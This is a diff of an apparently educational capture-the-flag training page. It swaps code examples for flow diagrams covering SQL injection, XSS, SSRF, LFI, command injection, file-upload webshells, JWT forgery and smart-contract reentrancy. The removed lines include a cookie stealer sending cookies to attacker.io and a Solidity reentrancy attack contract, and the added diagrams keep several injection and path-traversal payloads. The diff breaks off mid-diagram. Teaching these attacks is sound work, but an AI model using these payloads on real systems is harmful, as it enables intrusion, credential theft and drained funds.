@@ -569,7 +569,7 @@
     <div class="divider"></div>
     <div class="grid-2" style="max-width:900px;">
       <div class="card cyan">
-        <h3 style="color:var(--cyan);"> Web CTF Topics</h3>
+        <h3 style="color:var(--cyan);">🌐 Web CTF Topics</h3>
         <ul style="margin-top:8px;">
           <li>SQL Injection (SQLi)</li>
           <li>Cross-Site Scripting (XSS)</li>
@@ -582,7 +582,7 @@
         </ul>
       </div>
       <div class="card purple">
-        <h3 style="color:var(--purple);"> Blockchain CTF Topics</h3>
+        <h3 style="color:var(--purple);">⛓️ Blockchain CTF Topics</h3>
         <ul style="margin-top:8px;">
           <li>Reentrancy Attacks</li>
           <li>Integer Overflow / Underflow</li>
@@ -737,14 +737,58 @@
         </ul>
       </div>
     </div>
-    <pre><span class="cm">-- Auth bypass (classic)</span>
-<span class="var">username:</span> <span class="str">admin'--</span>
-<span class="var">password:</span> <span class="str">anything</span>
-
-<span class="cm">-- Resulting query (vulnerable)</span>
-<span class="kw">SELECT</span> <span class="op">*</span> <span class="kw">FROM</span> <span class="fn">users</span> <span class="kw">WHERE</span> user=<span class="str">'admin'</span><span class="cm">--'</span> <span class="kw">AND</span> pass=<span class="str">'anything'</span>
-
-</pre>
+    <!-- SQLi Attack Flow Diagram -->
+    <div style="width:100%;max-width:900px;">
+      <div style="font-family:'Share Tech Mono',monospace;font-size:11px;color:var(--muted);letter-spacing:2px;margin-bottom:10px;">▶ ATTACK FLOW</div>
+      <div style="display:flex;align-items:stretch;gap:0;flex-wrap:wrap;justify-content:center;">
+        <div style="background:#0d0d1a;border:1px solid rgba(255,45,120,0.4);border-radius:8px 0 0 8px;padding:14px 18px;min-width:140px;text-align:center;">
+          <div style="font-size:22px;">🧑</div>
+          <div style="font-size:11px;font-family:'Share Tech Mono',monospace;color:var(--pink);margin-top:4px;">ATTACKER</div>
+          <div style="font-size:10px;color:var(--muted);margin-top:4px;">Input Field</div>
+        </div>
+        <div style="display:flex;flex-direction:column;justify-content:center;align-items:center;padding:0 6px;">
+          <div style="color:var(--pink);font-size:18px;">→</div>
+          <div style="font-size:9px;color:var(--muted);font-family:'Share Tech Mono',monospace;white-space:nowrap;">admin'--</div>
+        </div>
+        <div style="background:#0d0d1a;border:1px solid rgba(0,245,255,0.3);padding:14px 18px;min-width:160px;text-align:center;">
+          <div style="font-size:22px;">🖥️</div>
+          <div style="font-size:11px;font-family:'Share Tech Mono',monospace;color:var(--cyan);margin-top:4px;">WEB APP</div>
+          <div style="font-size:10px;color:var(--muted);margin-top:4px;">Builds SQL Query</div>
+          <div style="margin-top:8px;background:#050510;border-radius:4px;padding:6px 8px;font-family:'Share Tech Mono',monospace;font-size:10px;text-align:left;"><span style="color:var(--purple);">SELECT</span> * <span style="color:var(--purple);">FROM</span> users<br><span style="color:var(--purple);">WHERE</span> user=<span style="color:var(--green);">'admin'</span><span style="color:var(--pink);">--</span><span style="color:var(--muted);">…</span></div>
+        </div>
+        <div style="display:flex;flex-direction:column;justify-content:center;align-items:center;padding:0 6px;">
+          <div style="color:var(--pink);font-size:18px;">→</div>
+          <div style="font-size:9px;color:var(--muted);font-family:'Share Tech Mono',monospace;">no password check</div>
+        </div>
+        <div style="background:#0d0d1a;border:1px solid rgba(0,255,136,0.3);padding:14px 18px;min-width:140px;text-align:center;">
+          <div style="font-size:22px;">🗄️</div>
+          <div style="font-size:11px;font-family:'Share Tech Mono',monospace;color:var(--green);margin-top:4px;">DATABASE</div>
+          <div style="font-size:10px;color:var(--muted);margin-top:4px;">Executes Query</div>
+        </div>
+        <div style="display:flex;flex-direction:column;justify-content:center;align-items:center;padding:0 6px;">
+          <div style="color:var(--green);font-size:18px;">→</div>
+          <div style="font-size:9px;color:var(--green);font-family:'Share Tech Mono',monospace;">rows returned</div>
+        </div>
+        <div style="background:#0d0d1a;border:2px solid var(--green);border-radius:0 8px 8px 0;padding:14px 18px;min-width:120px;text-align:center;">
+          <div style="font-size:22px;">🏁</div>
+          <div style="font-size:11px;font-family:'Share Tech Mono',monospace;color:var(--green);margin-top:4px;">LOGIN OK</div>
+          <div style="font-size:10px;color:var(--muted);margin-top:4px;">Flag captured</div>
+        </div>
+      </div>
+      <!-- UNION flow -->
+      <div style="margin-top:14px;background:#050510;border:1px solid #1a2040;border-radius:8px;padding:14px 20px;">
+        <div style="font-size:11px;font-family:'Share Tech Mono',monospace;color:var(--muted);margin-bottom:8px;">UNION-BASED EXTRACTION FLOW</div>
+        <div style="display:flex;gap:8px;align-items:center;flex-wrap:wrap;">
+          <span style="background:rgba(255,45,120,0.15);border:1px solid var(--pink);border-radius:4px;padding:4px 10px;font-family:'Share Tech Mono',monospace;font-size:11px;color:var(--pink);">id=1'</span>
+          <span style="color:var(--muted);">→</span>
+          <span style="background:rgba(168,85,247,0.15);border:1px solid var(--purple);border-radius:4px;padding:4px 10px;font-family:'Share Tech Mono',monospace;font-size:11px;color:var(--purple);">ORDER BY 1,2,3… (find cols)</span>
+          <span style="color:var(--muted);">→</span>
+          <span style="background:rgba(0,245,255,0.15);border:1px solid var(--cyan);border-radius:4px;padding:4px 10px;font-family:'Share Tech Mono',monospace;font-size:11px;color:var(--cyan);">UNION SELECT null,table_name,null</span>
+          <span style="color:var(--muted);">→</span>
+          <span style="background:rgba(0,255,136,0.15);border:1px solid var(--green);border-radius:4px;padding:4px 10px;font-family:'Share Tech Mono',monospace;font-size:11px;color:var(--green);">🏁 FLAG</span>
+        </div>
+      </div>
+    </div>
   </div>
 </div>
 
@@ -768,18 +812,57 @@
         <p>Payload processed by client-side JS (innerHTML, document.write). No server interaction needed.</p>
       </div>
     </div>
-    <pre><span class="cm">// Basic alert test</span>
-<span class="op">&lt;</span><span class="fn">script</span><span class="op">&gt;</span><span class="fn">alert</span>(<span class="num">1</span>)<span class="op">&lt;/</span><span class="fn">script</span><span class="op">&gt;</span>
-
-<span class="cm">// Bypass filter (no script tag)</span>
-<span class="op">&lt;</span><span class="fn">img</span> src=<span class="str">x</span> onerror=<span class="str">"alert(1)"</span><span class="op">&gt;</span>
-<span class="op">&lt;</span><span class="fn">svg</span> onload=<span class="str">"alert(1)"</span><span class="op">&gt;</span>
-
-<span class="cm">// Cookie stealer (CTF flag via admin bot)</span>
-<span class="op">&lt;</span><span class="fn">script</span><span class="op">&gt;</span><span class="fn">fetch</span>(<span class="str">`https://attacker.io/?c=${document.cookie}`</span>)<span class="op">&lt;/</span><span class="fn">script</span><span class="op">&gt;</span>
-
-<span class="cm">// CSP bypass — use dangling markup or nonce leak if misconfigured</span>
-</pre>
+    <!-- XSS Flow Diagram -->
+    <div style="width:100%;max-width:900px;">
+      <div style="font-family:'Share Tech Mono',monospace;font-size:11px;color:var(--muted);letter-spacing:2px;margin-bottom:10px;">▶ STORED XSS ATTACK FLOW (most impactful)</div>
+      <div style="display:flex;gap:0;align-items:stretch;flex-wrap:wrap;justify-content:center;">
+        <div style="background:#0d0d1a;border:1px solid rgba(255,107,53,0.4);border-radius:8px 0 0 8px;padding:12px 14px;text-align:center;min-width:110px;">
+          <div style="font-size:22px;">😈</div>
+          <div style="font-size:11px;font-family:'Share Tech Mono',monospace;color:var(--orange);">ATTACKER</div>
+          <div style="font-size:10px;color:var(--muted);margin-top:4px;">Posts payload</div>
+        </div>
+        <div style="display:flex;align-items:center;padding:0 4px;"><span style="color:var(--orange);font-size:16px;">→</span></div>
+        <div style="background:#0d0d1a;border:1px solid rgba(0,245,255,0.3);padding:12px 14px;text-align:center;min-width:130px;">
+          <div style="font-size:22px;">🗄️</div>
+          <div style="font-size:11px;font-family:'Share Tech Mono',monospace;color:var(--cyan);">DATABASE</div>
+          <div style="font-size:10px;color:var(--muted);margin-top:4px;">Stores payload</div>
+          <div style="margin-top:6px;background:#050510;border-radius:4px;padding:4px 6px;font-family:'Share Tech Mono',monospace;font-size:9px;color:var(--orange);">&lt;script&gt;...&lt;/script&gt;</div>
+        </div>
+        <div style="display:flex;align-items:center;padding:0 4px;"><span style="color:var(--muted);font-size:16px;">→</span></div>
+        <div style="background:#0d0d1a;border:1px solid rgba(168,85,247,0.3);padding:12px 14px;text-align:center;min-width:130px;">
+          <div style="font-size:22px;">🤖</div>
+          <div style="font-size:11px;font-family:'Share Tech Mono',monospace;color:var(--purple);">ADMIN BOT</div>
+          <div style="font-size:10px;color:var(--muted);margin-top:4px;">Visits page</div>
+          <div style="font-size:10px;color:var(--pink);margin-top:4px;">executes script</div>
+        </div>
+        <div style="display:flex;align-items:center;padding:0 4px;"><span style="color:var(--pink);font-size:16px;">→</span></div>
+        <div style="background:#0d0d1a;border:1px solid rgba(255,45,120,0.4);padding:12px 14px;text-align:center;min-width:130px;">
+          <div style="font-size:22px;">🍪</div>
+          <div style="font-size:11px;font-family:'Share Tech Mono',monospace;color:var(--pink);">COOKIE SENT</div>
+          <div style="font-size:10px;color:var(--muted);margin-top:4px;">to attacker server</div>
+        </div>
+        <div style="display:flex;align-items:center;padding:0 4px;"><span style="color:var(--green);font-size:16px;">→</span></div>
+        <div style="background:#0d0d1a;border:2px solid var(--green);border-radius:0 8px 8px 0;padding:12px 14px;text-align:center;min-width:100px;">
+          <div style="font-size:22px;">🏁</div>
+          <div style="font-size:11px;font-family:'Share Tech Mono',monospace;color:var(--green);">FLAG</div>
+        </div>
+      </div>
+      <!-- XSS context break -->
+      <div style="margin-top:12px;display:grid;grid-template-columns:repeat(3,1fr);gap:10px;">
+        <div style="background:#050510;border:1px solid rgba(255,107,53,0.3);border-radius:6px;padding:10px;">
+          <div style="font-family:'Share Tech Mono',monospace;font-size:10px;color:var(--orange);margin-bottom:6px;">HTML CONTEXT</div>
+          <div style="font-family:'Share Tech Mono',monospace;font-size:10px;color:var(--green);">&lt;img src=x onerror=alert(1)&gt;</div>
+        </div>
+        <div style="background:#050510;border:1px solid rgba(168,85,247,0.3);border-radius:6px;padding:10px;">
+          <div style="font-family:'Share Tech Mono',monospace;font-size:10px;color:var(--purple);margin-bottom:6px;">ATTR CONTEXT</div>
+          <div style="font-family:'Share Tech Mono',monospace;font-size:10px;color:var(--green);">"&gt;&lt;script&gt;alert(1)&lt;/script&gt;</div>
+        </div>
+        <div style="background:#050510;border:1px solid rgba(0,245,255,0.3);border-radius:6px;padding:10px;">
+          <div style="font-family:'Share Tech Mono',monospace;font-size:10px;color:var(--cyan);margin-bottom:6px;">JS CONTEXT</div>
+          <div style="font-family:'Share Tech Mono',monospace;font-size:10px;color:var(--green);">'-alert(1)-'</div>
+        </div>
+      </div>
+    </div>
     <div class="card cyan" style="max-width:900px;margin-top:0;">
       <h3 style="color:var(--cyan);">CTF XSS Steps</h3>
       <p>1. Find reflection point → 2. Break out of context (&lt;tag attr="HERE"&gt;) → 3. Craft payload → 4. If admin bot: steal session cookie or redirect to /flag → 5. Submit to bot URL</p>
@@ -801,7 +884,7 @@
           <li>Target: <code style="color:var(--cyan);">http://127.0.0.1/admin</code></li>
           <li>Cloud metadata: <code style="color:var(--cyan);">http://169.254.169.254/latest/meta-data/</code></li>
           <li>Bypass: <code style="color:var(--cyan);">http://0x7f000001/</code> or DNS rebinding</li>
-          <li>Scheme abuse: <code style="color:var(--cyan);">file:///etc/passwd</code> </li>
+          <li>Scheme abuse: <code style="color:var(--cyan);">file:///etc/passwd</code>, <code style="color:var(--cyan);">gopher://</code></li>
         </ul>
       </div>
       <div class="card green">
@@ -815,12 +898,34 @@
         </ul>
       </div>
     </div>
-    <div class="terminal" style="margin-top:8px;">
-      <div><span class="prompt">$</span> <span class="cmd">curl "http://target/fetch?url=http://127.0.0.1:8080/admin"</span></div>
-      <div><span class="out">{"admin":"true","flag":"CTF{ssrf_internal_win}"}</span></div>
-      <div style="margin-top:8px;"><span class="prompt">$</span> <span class="cmd">curl "http://target/?page=php://filter/convert.base64-encode/resource=config.php"</span></div>
-      <div><span class="out">PD9waHAgJGZsYWcgPSAiQ1RGe2xmaV9yZWFkfSI7</span></div>
-      <div><span class="info"># base64 decode → flag found in config.php</span></div>
+    <!-- SSRF + LFI Diagrams -->
+    <div style="width:100%;max-width:900px;display:grid;grid-template-columns:1fr 1fr;gap:14px;">
+      <!-- SSRF -->
+      <div style="background:#050510;border:1px solid rgba(0,245,255,0.3);border-radius:8px;padding:14px;">
+        <div style="font-family:'Share Tech Mono',monospace;font-size:10px;color:var(--cyan);letter-spacing:2px;margin-bottom:10px;">SSRF FLOW</div>
+        <div style="display:flex;flex-direction:column;gap:6px;align-items:center;">
+          <div style="background:rgba(255,45,120,0.12);border:1px solid var(--pink);border-radius:6px;padding:8px 14px;font-family:'Share Tech Mono',monospace;font-size:11px;color:var(--pink);text-align:center;">😈 Attacker<br><span style="color:var(--muted);font-size:9px;">sends url=http://127.0.0.1/admin</span></div>
+          <div style="color:var(--cyan);font-size:20px;">↓</div>
+          <div style="background:rgba(0,245,255,0.08);border:1px solid var(--cyan);border-radius:6px;padding:8px 14px;font-family:'Share Tech Mono',monospace;font-size:11px;color:var(--cyan);text-align:center;">🌐 Web Server<br><span style="color:var(--muted);font-size:9px;">fetches the URL itself</span></div>
+          <div style="color:var(--cyan);font-size:20px;">↓</div>
+          <div style="background:rgba(0,255,136,0.08);border:1px solid var(--green);border-radius:6px;padding:8px 14px;font-family:'Share Tech Mono',monospace;font-size:11px;color:var(--green);text-align:center;">🔒 Internal Service<br><span style="color:var(--muted);font-size:9px;">http://127.0.0.1:8080/admin</span></div>
+          <div style="color:var(--green);font-size:20px;">↓</div>
+          <div style="background:rgba(0,255,136,0.15);border:2px solid var(--green);border-radius:6px;padding:8px 14px;font-family:'Share Tech Mono',monospace;font-size:11px;color:var(--green);text-align:center;">🏁 FLAG returned</div>
+        </div>
+      </div>
+      <!-- LFI -->
+      <div style="background:#050510;border:1px solid rgba(0,255,136,0.3);border-radius:8px;padding:14px;">
+        <div style="font-family:'Share Tech Mono',monospace;font-size:10px;color:var(--green);letter-spacing:2px;margin-bottom:10px;">LFI FLOW</div>
+        <div style="display:flex;flex-direction:column;gap:6px;align-items:center;">
+          <div style="background:rgba(255,45,120,0.12);border:1px solid var(--pink);border-radius:6px;padding:8px 14px;font-family:'Share Tech Mono',monospace;font-size:11px;color:var(--pink);text-align:center;">😈 Attacker<br><span style="color:var(--muted);font-size:9px;">?page=../../../etc/passwd</span></div>
+          <div style="color:var(--green);font-size:20px;">↓</div>
+          <div style="background:rgba(0,245,255,0.08);border:1px solid var(--cyan);border-radius:6px;padding:8px 14px;font-family:'Share Tech Mono',monospace;font-size:11px;color:var(--cyan);text-align:center;">🖥️ PHP include()<br><span style="color:var(--muted);font-size:9px;">resolves path traversal</span></div>
+          <div style="color:var(--green);font-size:20px;">↓</div>
+          <div style="background:rgba(168,85,247,0.08);border:1px solid var(--purple);border-radius:6px;padding:8px 14px;font-family:'Share Tech Mono',monospace;font-size:11px;color:var(--purple);text-align:center;">📄 php://filter<br><span style="color:var(--muted);font-size:9px;">base64-encode source</span></div>
+          <div style="color:var(--green);font-size:20px;">↓</div>
+          <div style="background:rgba(0,255,136,0.15);border:2px solid var(--green);border-radius:6px;padding:8px 14px;font-family:'Share Tech Mono',monospace;font-size:11px;color:var(--green);text-align:center;">🏁 FLAG in file</div>
+        </div>
+      </div>
     </div>
   </div>
 </div>
@@ -852,19 +957,54 @@
         </ul>
       </div>
     </div>
-    <pre><span class="cm">// JWT Structure: header.payload.signature (base64url encoded)</span>
-<span class="cm">// Decode at jwt.io or manually:</span>
-<span class="var">header</span>  = <span class="fn">base64url_decode</span>(<span class="str">"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9"</span>)
-<span class="cm">// → {"alg":"HS256","typ":"JWT"}</span>
-
-<span class="cm">// alg:none bypass</span>
-<span class="var">forged_header</span> = <span class="fn">base64url</span>(<span class="str">'{"alg":"none","typ":"JWT"}'</span>)
-<span class="var">forged_payload</span> = <span class="fn">base64url</span>(<span class="str">'{"user":"admin","role":"admin"}'</span>)
-<span class="var">token</span> = forged_header + <span class="str">"."</span> + forged_payload + <span class="str">"."</span>   <span class="cm">// empty sig</span>
-
-<span class="cm">// Crack with jwt_tool</span>
-<span class="fn">python3</span> jwt_tool.py [TOKEN] <span class="op">-C</span> <span class="op">-d</span> rockyou.txt
-</pre>
+    <!-- JWT Anatomy + Attack Diagram -->
+    <div style="width:100%;max-width:900px;">
+      <!-- JWT structure -->
+      <div style="font-family:'Share Tech Mono',monospace;font-size:10px;color:var(--muted);letter-spacing:2px;margin-bottom:8px;">JWT STRUCTURE</div>
+      <div style="display:flex;gap:2px;align-items:stretch;margin-bottom:14px;flex-wrap:wrap;">
+        <div style="flex:1;min-width:100px;background:rgba(168,85,247,0.12);border:1px solid var(--purple);border-radius:6px 0 0 6px;padding:10px 12px;text-align:center;">
+          <div style="font-family:'Share Tech Mono',monospace;font-size:10px;color:var(--purple);margin-bottom:4px;">HEADER</div>
+          <div style="font-family:'Share Tech Mono',monospace;font-size:9px;color:var(--muted);">alg, typ</div>
+          <div style="font-family:'Share Tech Mono',monospace;font-size:9px;color:var(--purple);margin-top:4px;">eyJhbGci…</div>
+        </div>
+        <div style="display:flex;align-items:center;padding:0 4px;color:var(--muted);">.</div>
+        <div style="flex:1.5;min-width:130px;background:rgba(0,245,255,0.12);border:1px solid var(--cyan);padding:10px 12px;text-align:center;">
+          <div style="font-family:'Share Tech Mono',monospace;font-size:10px;color:var(--cyan);margin-bottom:4px;">PAYLOAD</div>
+          <div style="font-family:'Share Tech Mono',monospace;font-size:9px;color:var(--muted);">user, role, exp</div>
+          <div style="font-family:'Share Tech Mono',monospace;font-size:9px;color:var(--cyan);margin-top:4px;">eyJ1c2Vy…</div>
+        </div>
+        <div style="display:flex;align-items:center;padding:0 4px;color:var(--muted);">.</div>
+        <div style="flex:1;min-width:100px;background:rgba(0,255,136,0.12);border:1px solid var(--green);border-radius:0 6px 6px 0;padding:10px 12px;text-align:center;">
+          <div style="font-family:'Share Tech Mono',monospace;font-size:10px;color:var(--green);margin-bottom:4px;">SIGNATURE</div>
+          <div style="font-family:'Share Tech Mono',monospace;font-size:9px;color:var(--muted);">HMAC / RSA</div>
+          <div style="font-family:'Share Tech Mono',monospace;font-size:9px;color:var(--green);margin-top:4px;">SflKxwR…</div>
+        </div>
+      </div>
+      <!-- attacks -->
+      <div style="font-family:'Share Tech Mono',monospace;font-size:10px;color:var(--muted);letter-spacing:2px;margin-bottom:8px;">ATTACK TECHNIQUES</div>
+      <div style="display:grid;grid-template-columns:1fr 1fr;gap:10px;">
+        <div style="background:#050510;border:1px solid rgba(255,45,120,0.4);border-radius:6px;padding:10px 14px;">
+          <div style="font-family:'Share Tech Mono',monospace;font-size:10px;color:var(--pink);margin-bottom:6px;">① ALG:NONE BYPASS</div>
+          <div style="display:flex;gap:6px;align-items:center;flex-wrap:wrap;">
+            <span style="background:rgba(168,85,247,0.15);border:1px solid var(--purple);border-radius:4px;padding:3px 8px;font-family:'Share Tech Mono',monospace;font-size:9px;color:var(--purple);">alg: HS256</span>
+            <span style="color:var(--pink);font-size:12px;">→</span>
+            <span style="background:rgba(255,45,120,0.15);border:1px solid var(--pink);border-radius:4px;padding:3px 8px;font-family:'Share Tech Mono',monospace;font-size:9px;color:var(--pink);">alg: none</span>
+            <span style="color:var(--pink);font-size:12px;">→</span>
+            <span style="background:rgba(0,255,136,0.15);border:1px solid var(--green);border-radius:4px;padding:3px 8px;font-family:'Share Tech Mono',monospace;font-size:9px;color:var(--green);">empty sig ✓</span>
+          </div>
+        </div>
+        <div style="background:#050510;border:1px solid rgba(255,215,0,0.4);border-radius:6px;padding:10px 14px;">
+          <div style="font-family:'Share Tech Mono',monospace;font-size:10px;color:var(--yellow);margin-bottom:6px;">② WEAK SECRET CRACK</div>
+          <div style="display:flex;gap:6px;align-items:center;flex-wrap:wrap;">
+            <span style="background:rgba(255,215,0,0.1);border:1px solid var(--yellow);border-radius:4px;padding:3px 8px;font-family:'Share Tech Mono',monospace;font-size:9px;color:var(--yellow);">TOKEN</span>
+            <span style="color:var(--muted);font-size:12px;">→</span>
+            <span style="background:rgba(168,85,247,0.1);border:1px solid var(--purple);border-radius:4px;padding:3px 8px;font-family:'Share Tech Mono',monospace;font-size:9px;color:var(--purple);">hashcat / jwt_tool</span>
+            <span style="color:var(--muted);font-size:12px;">→</span>
+            <span style="background:rgba(0,255,136,0.15);border:1px solid var(--green);border-radius:4px;padding:3px 8px;font-family:'Share Tech Mono',monospace;font-size:9px;color:var(--green);">secret found ✓</span>
+          </div>
+        </div>
+      </div>
+    </div>
   </div>
 </div>
 
@@ -898,15 +1038,39 @@
         </ul>
       </div>
     </div>
-    <div class="terminal">
-      <div><span class="cm"># Command Injection via ping field</span></div>
-      <div><span class="prompt">POST</span> <span class="cmd">/ping  body: host=8.8.8.8; cat /flag</span></div>
-      <div><span class="out">PING 8.8.8.8 ... CTF{rce_via_cmdi}</span></div>
-      <div style="margin-top:8px;"><span class="cm"># Webshell (upload shell.php → access it)</span></div>
-      <div><span class="prompt">$</span> <span class="cmd">curl http://target/uploads/shell.php?cmd=id</span></div>
-      <div><span class="out">uid=33(www-data) gid=33(www-data)</span></div>
-      <div><span class="prompt">$</span> <span class="cmd">curl "http://target/uploads/shell.php?cmd=cat+/flag"</span></div>
-      <div><span class="out">CTF{webshell_rce}</span></div>
+    <!-- CMDi + Upload Flow Diagrams -->
+    <div style="width:100%;max-width:900px;display:grid;grid-template-columns:1fr 1fr;gap:14px;">
+      <!-- CMDi -->
+      <div style="background:#050510;border:1px solid rgba(255,45,120,0.3);border-radius:8px;padding:14px;">
+        <div style="font-family:'Share Tech Mono',monospace;font-size:10px;color:var(--pink);letter-spacing:2px;margin-bottom:10px;">CMD INJECTION FLOW</div>
+        <div style="display:flex;flex-direction:column;gap:6px;align-items:stretch;">
+          <div style="display:flex;gap:6px;align-items:center;">
+            <div style="background:rgba(255,45,120,0.12);border:1px solid var(--pink);border-radius:5px;padding:7px 10px;font-family:'Share Tech Mono',monospace;font-size:10px;color:var(--pink);flex:1;text-align:center;">User Input<br><span style="color:var(--muted);font-size:9px;">host=8.8.8.8</span></div>
+            <span style="color:var(--pink);font-size:18px;">→</span>
+            <div style="background:rgba(0,245,255,0.08);border:1px solid var(--cyan);border-radius:5px;padding:7px 10px;font-family:'Share Tech Mono',monospace;font-size:10px;color:var(--cyan);flex:1;text-align:center;">App builds<br><span style="color:var(--muted);font-size:9px;">ping [input]</span></div>
+          </div>
+          <div style="text-align:center;color:var(--pink);font-size:18px;">↓ inject ; cat /flag</div>
+          <div style="background:rgba(0,255,136,0.08);border:1px solid var(--green);border-radius:5px;padding:7px 10px;font-family:'Share Tech Mono',monospace;font-size:10px;text-align:center;">
+            <span style="color:var(--green);">ping 8.8.8.8 </span><span style="color:var(--pink);font-weight:bold;">; cat /flag</span>
+            <div style="color:var(--muted);font-size:9px;margin-top:4px;">OS executes both commands</div>
+          </div>
+          <div style="text-align:center;color:var(--green);font-size:18px;">↓</div>
+          <div style="background:rgba(0,255,136,0.15);border:2px solid var(--green);border-radius:5px;padding:7px 10px;font-family:'Share Tech Mono',monospace;font-size:10px;color:var(--green);text-align:center;">🏁 FLAG output</div>
+        </div>
+      </div>
+      <!-- File Upload -->
+      <div style="background:#050510;border:1px solid rgba(255,107,53,0.3);border-radius:8px;padding:14px;">
+        <div style="font-family:'Share Tech Mono',monospace;font-size:10px;color:var(--orange);letter-spacing:2px;margin-bottom:10px;">FILE UPLOAD RCE FLOW</div>
+        <div style="display:flex;flex-direction:column;gap:6px;align-items:stretch;">
+          <div style="background:rgba(255,45,120,0.12);border:1px solid var(--pink);border-radius:5px;padding:7px 10px;font-family:'Share Tech Mono',monospace;font-size:10px;color:var(--pink);text-align:center;">Upload shell.php<br><span style="color:var(--muted);font-size:9px;">Content-Type: image/jpeg</span></div>
+          <div style="text-align:center;color:var(--orange);font-size:18px;">↓ bypass MIME check</div>
+          <div style="background:rgba(0,245,255,0.08);border:1px solid var(--cyan);border-radius:5px;padding:7px 10px;font-family:'Share Tech Mono',monospace;font-size:10px;color:var(--cyan);text-align:center;">File saved to<br><span style="color:var(--muted);font-size:9px;">/uploads/shell.php</span></div>
+          <div style="text-align:center;color:var(--orange);font-size:18px;">↓ access URL</div>
+          <div style="background:rgba(168,85,247,0.08);border:1px solid var(--purple);border-radius:5px;padding:7px 10px;font-family:'Share Tech Mono',monospace;font-size:10px;color:var(--purple);text-align:center;">/uploads/shell.php?cmd=cat /flag<br><span style="color:var(--muted);font-size:9px;">PHP interprets as code</span></div>
+          <div style="text-align:center;color:var(--green);font-size:18px;">↓</div>
+          <div style="background:rgba(0,255,136,0.15);border:2px solid var(--green);border-radius:5px;padding:7px 10px;font-family:'Share Tech Mono',monospace;font-size:10px;color:var(--green);text-align:center;">🏁 FLAG via RCE</div>
+        </div>
+      </div>
     </div>
   </div>
 </div>
@@ -1039,23 +1203,57 @@
         </ul>
       </div>
     </div>
-    <pre><span class="cm">// ❌ VULNERABLE CONTRACT</span>
-<span class="kw">contract</span> <span class="fn">Vault</span> {
-  <span class="kw">mapping</span>(<span class="kw">address</span> <span class="op">=&gt;</span> <span class="kw">uint</span>) <span class="kw">public</span> <span class="var">balances</span>;
-  <span class="kw">function</span> <span class="fn">withdraw</span>() <span class="kw">public</span> {
-    <span class="kw">uint</span> <span class="var">amt</span> = balances[msg.sender];
-    (<span class="kw">bool</span> ok,) = msg.sender.<span class="fn">call</span>{value: amt}(<span class="str">""</span>);  <span class="cm">// ← sends ETH first</span>
-    balances[msg.sender] = <span class="num">0</span>;                        <span class="cm">// ← updates AFTER</span>
-  }
-}
-
-<span class="cm">// ✅ ATTACKER CONTRACT</span>
-<span class="kw">contract</span> <span class="fn">Attack</span> {
-  <span class="fn">Vault</span> <span class="var">vault</span>;
-  <span class="kw">constructor</span>(<span class="kw">address</span> <span class="var">v</span>) <span class="kw">payable</span> { vault = <span class="fn">Vault</span>(v); }
-  <span class="kw">function</span> <span class="fn">attack</span>() <span class="kw">external</span> <span class="kw">payable</span> { vault.<span class="fn">deposit</span>{value:<span class="num">1</span> ether}(); vault.<span class="fn">withdraw</span>(); }
-  <span class="kw">fallback</span>() <span class="kw">external payable</span> { <span class="kw">if</span> (<span class="kw">address</span>(vault).balance <span class="op">&gt;</span> <span class="num">0</span>) vault.<span class="fn">withdraw</span>(); }
-}</pre>
+    <!-- Reentrancy recursive call diagram -->
+    <div style="width:100%;max-width:900px;">
+      <div style="font-family:'Share Tech Mono',monospace;font-size:10px;color:var(--muted);letter-spacing:2px;margin-bottom:10px;">▶ REENTRANCY RECURSIVE CALL DIAGRAM</div>
+      <div style="display:flex;gap:16px;align-items:flex-start;flex-wrap:wrap;">
+        <!-- Attacker column -->
+        <div style="flex:1;min-width:160px;">
+          <div style="background:rgba(255,45,120,0.12);border:1px solid var(--pink);border-radius:8px 8px 0 0;padding:10px 14px;text-align:center;">
+            <div style="font-size:20px;">😈</div>
+            <div style="font-family:'Share Tech Mono',monospace;font-size:11px;color:var(--pink);">ATTACKER</div>
+            <div style="font-family:'Share Tech Mono',monospace;font-size:9px;color:var(--muted);margin-top:2px;">Attack Contract</div>
+          </div>
+          <div style="border-left:2px dashed var(--pink);margin-left:50%;height:28px;"></div>
+          <div style="background:#050510;border:1px solid rgba(255,45,120,0.3);border-radius:4px;padding:7px 10px;font-family:'Share Tech Mono',monospace;font-size:10px;color:var(--muted);">① deposit(1 ETH)</div>
+          <div style="border-left:2px dashed var(--pink);margin-left:50%;height:14px;"></div>
+          <div style="background:#050510;border:1px solid rgba(255,45,120,0.3);border-radius:4px;padding:7px 10px;font-family:'Share Tech Mono',monospace;font-size:10px;color:var(--muted);">② withdraw()</div>
+          <div style="border-left:2px dashed var(--green);margin-left:50%;height:14px;"></div>
+          <div style="background:#050510;border:1px solid rgba(0,255,136,0.3);border-radius:4px;padding:7px 10px;font-family:'Share Tech Mono',monospace;font-size:10px;color:var(--green);">⑤ fallback() triggered<br><span style="color:var(--pink);">→ calls withdraw() again</span></div>
+          <div style="border-left:2px dashed var(--green);margin-left:50%;height:14px;"></div>
+          <div style="background:rgba(0,255,136,0.15);border:2px solid var(--green);border-radius:4px;padding:7px 10px;font-family:'Share Tech Mono',monospace;font-size:10px;color:var(--green);text-align:center;">🏁 Vault drained!</div>
+        </div>
+        <!-- arrows -->
+        <div style="display:flex;flex-direction:column;justify-content:center;align-items:center;padding-top:50px;gap:28px;">
+          <div style="color:var(--pink);font-size:22px;text-align:center;">⟶<br><span style="font-size:9px;color:var(--muted);font-family:'Share Tech Mono',monospace;">call</span></div>
+          <div style="color:var(--green);font-size:22px;text-align:center;">⟵<br><span style="font-size:9px;color:var(--green);font-family:'Share Tech Mono',monospace;">ETH sent</span></div>
+          <div style="color:var(--pink);font-size:22px;text-align:center;">⟶<br><span style="font-size:9px;color:var(--pink);font-family:'Share Tech Mono',monospace;">re-enter!</span></div>
+        </div>
+        <!-- Vault column -->
+        <div style="flex:1;min-width:160px;">
+          <div style="background:rgba(0,245,255,0.08);border:1px solid var(--cyan);border-radius:8px 8px 0 0;padding:10px 14px;text-align:center;">
+            <div style="font-size:20px;">🏦</div>
+            <div style="font-family:'Share Tech Mono',monospace;font-size:11px;color:var(--cyan);">VAULT CONTRACT</div>
+            <div style="font-family:'Share Tech Mono',monospace;font-size:9px;color:var(--muted);margin-top:2px;">Vulnerable</div>
+          </div>
+          <div style="border-left:2px dashed var(--cyan);margin-left:50%;height:28px;"></div>
+          <div style="background:#050510;border:1px solid rgba(0,245,255,0.3);border-radius:4px;padding:7px 10px;font-family:'Share Tech Mono',monospace;font-size:10px;color:var(--muted);">③ send ETH to caller</div>
+          <div style="border-left:2px dashed var(--cyan);margin-left:50%;height:14px;"></div>
